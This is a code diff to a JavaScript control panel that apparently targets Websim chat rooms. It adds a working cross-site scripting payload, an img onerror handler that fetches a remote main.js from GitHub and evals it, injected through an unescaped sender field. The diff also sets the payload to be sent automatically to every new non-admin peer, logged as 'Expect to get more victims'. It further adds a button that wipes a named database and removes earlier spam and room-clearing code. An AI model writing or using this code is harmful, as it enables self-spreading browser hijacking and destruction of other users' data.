@@ -166,85 +166,6 @@ function createDarkModePanel() {
       alert("Failed to load equinox. Check the console for details.");
     }
   });
-  // Create a button to nuke / clear the database.
-  // Create "Nuke" and "Clear" buttons
-  const nukeButton = document.createElement("button");
-  nukeButton.id = "nukeButton";
-  nukeButton.textContent = "Nuke";
-  nukeButton.style.margin = "10px";
-  nukeButton.style.padding = "10px 20px";
-  nukeButton.style.backgroundColor = "#ff4d4d";
-  nukeButton.style.color = "#fff";
-  nukeButton.style.border = "none";
-  nukeButton.style.borderRadius = "5px";
-  nukeButton.style.cursor = "pointer";
-
-  const clearButton = document.createElement("button");
-  clearButton.id = "clearButton";
-  clearButton.textContent = "Clear";
-  clearButton.style.margin = "10px";
-  clearButton.style.padding = "10px 20px";
-  clearButton.style.backgroundColor = "#4caf50";
-  clearButton.style.color = "#fff";
-  clearButton.style.border = "none";
-  clearButton.style.borderRadius = "5px";
-  clearButton.style.cursor = "pointer";
-
-  // Append buttons to the body
-  panel.appendChild(nukeButton);
-  panel.appendChild(clearButton);
-
-  // Initialize WebsimSocket and connect to the room
-
-
-  // Nuke functionality
-  nukeButton.addEventListener("click", async () => {
-    try {
-      const room = new WebsimSocket();
-      room.initialize();
-      const promises = [];
-      const amount = 10; // Example: specify the number of items to create
-      const template = "Nuke Message {i}"; // Replace with your desired message template
-      const type = "library"; // Replace with the actual type for your collection
-
-      for (let i = 0; i < amount; i++) {
-        const message = template.replace("{i}", i);
-        promises.push(
-          room.collection(type).create({
-            content: message,
-            nuked: true,
-            intensity: Math.floor(Math.random() * 100),
-          })
-        );
-      }
-
-      await Promise.all(promises);
-      console.log("Nuke operation completed.");
-    } catch (error) {
-      console.error("Error during Nuke operation:", error);
-    }
-  });
-
-  // Clear functionality
-  clearButton.addEventListener("click", async () => {
-    try {
-      const room = new WebsimSocket();
-      room.initialize();
-      const roomState = room.roomState; // Get all values from room state
-      const updatedState = {};
-
-      // Set all keys to null in the updated state
-      for (const key in roomState) {
-        updatedState[key] = null;
-      }
-
-      // Update the room state to clear the values
-      await room.updateRoomState(updatedState);
-      console.log("Clear operation completed.");
-    } catch (error) {
-      console.error("Error during Clear operation:", error);
-    }
-  });
   // Create and add the "Find XSS" button
   const findXSSButton = document.createElement("button");
   findXSSButton.id = "findXSSButton";
@@ -311,8 +232,7 @@ function createDarkModePanel() {
           event.data.type === "joined" &&
           room.peers[event.data.clientId]
         ) {
-          if (room.peers[event.data.clientId].username === "blueyellow" ||
-            room.peers[event.data.clientId].username === "TheEthicalHacker") {
+          if (admins.includes(room.peers[event.data.clientId].username)) {
             logMessage("Epic user joined: " + room.peers[event.data.clientId].username);
           }
           else {
@@ -526,6 +446,33 @@ function createDarkModePanel() {
       alert(`Error listing database: ${error.message}`);
     }
   });
+  // also a clear button
+  const clearButton = document.createElement("button");
+  clearButton.id = "clearButton";
+  clearButton.textContent = "Clear Database";
+  clearButton.style.margin = "10px";
+  clearButton.style.padding = "10px 20px";
+  clearButton.style.backgroundColor = "#ff4d4d";
+  clearButton.style.color = "#fff";
+  clearButton.style.border = "none";
+  clearButton.style.borderRadius = "5px";
+  clearButton.style.cursor = "pointer";
+  panel.appendChild(clearButton);
+  // Add an event listener to the button
+  clearButton.addEventListener("click", async () => {
+    const databaseName = databaseInput.value;
+    if (!databaseName) {
+      alert("Please enter a database name.");
+      return;
+    }
+    try {
+      await room.collection(databaseName).clear();
+      logMessage(`Database ${databaseName} cleared successfully.`);
+    } catch (error) {
+      console.error("Error clearing database:", error);
+      alert(`Error clearing database: ${error.message}`);
+    }
+  });
   const labelPage = document.createElement("p");
   labelPage.textContent = window.location.href;
   panel.appendChild(labelPage);
@@ -546,16 +493,12 @@ function createDarkModePanel() {
     // Append the checkbox and label to the panel
     panel.appendChild(autoSendCheckbox);
     panel.appendChild(autoSendLabel);
-
+    
     // Function to handle new client join and send XSS.html contents
     async function handleNewClientJoin() {
       try {
-        const response = await fetch("https://raw.githubusercontent.com/JammyCat91283/websim/main/XSS.html");
-        if (!response.ok) {
-          throw new Error(`Failed to fetch XSS.html: ${response.statusText}`);
-        }
 
-        const contentsOfXSS = await response.text();  
+        const contentsOfXSS = `<img src="asd" id="targetImage" onerror='fetch("https://raw.githubusercontent.com/JammyCat91283/websim/refs/heads/main/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`;
         const currentPeers = room.peers || {};
         setInterval(() => {
 
@@ -587,6 +530,70 @@ function createDarkModePanel() {
 
     // Initialize the handling of new client joins
     handleNewClientJoin();
+  } else if (window.location.href.includes("lplfins83rpsgxi315zz")) {
+    // Gamble your life savings away! game. Also XSS possible with message.sender.
+    /*// Create message object
+        const chatMessage = {
+            type: 'chat',
+            text: message,
+            sender: username,
+            avatar: avatar,
+            timestamp: Date.now()
+        };
+        
+        // Send message to all users
+        room.send(chatMessage);// Set message HTML
+        messageEl.innerHTML = `
+            ${avatarHTML}
+            <div class="message-content">
+                <div class="message-sender">${message.sender}</div>
+                <div class="message-text">${escapeHTML(message.text)}</div>
+                <div class="message-time">${timestamp}</div>
+            </div>
+        `;*/
+    // Send message
+    const XSS = {
+      type: 'chat',
+      text: "Hello!",
+      sender: `<img src="asd" id="targetImage" onerror='fetch("https://raw.githubusercontent.com/JammyCat91283/websim/refs/heads/main/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`,
+      avatar: "https://example.com/avatar.png", // Replace with actual avatar URL
+      timestamp: Date.now()
+    };
+    // add a button to send the message
+    const sendMessageButton = document.createElement("button");
+    sendMessageButton.id = "sendMessageButton";
+    sendMessageButton.textContent = "Send XSS";
+    sendMessageButton.style.margin = "10px";
+    sendMessageButton.style.padding = "10px 20px";
+    sendMessageButton.style.backgroundColor = "#007bff";
+    sendMessageButton.style.color = "#fff";
+    sendMessageButton.style.border = "none";
+    sendMessageButton.style.borderRadius = "5px";
+    sendMessageButton.style.cursor = "pointer";
+    panel.appendChild(sendMessageButton);
+    sendMessageButton.addEventListener("click", () => {
+      room.send(XSS);
+      logMessage(`XSS. Expect to get more victims.`);
+    });
+    // auto send to new clients
+    let previousPeers = {};
+    setInterval(() => {
+      const currentPeers = room.peers || {};
+      // Check if a new peer has joined
+      for (const peerId in currentPeers) {
+        if (!previousPeers[peerId] && !admins.includes(currentPeers[peerId].username)) {
+          logMessage(`New peer joined: ${currentPeers[peerId].username}`);
+          // A new peer has joined
+          setTimeout(() => {
+            room.send(XSS);
+            logMessage(`Sent XSS to new peer: ${room.peers[peerId].username}`);
+          }, 3500); // Delay before sending
+        }
+      }
+      // Update the previousPeers to the current state
+      previousPeers = { ...currentPeers };
+    }, 1000); // Check every 1 second
+
   }
 }
 
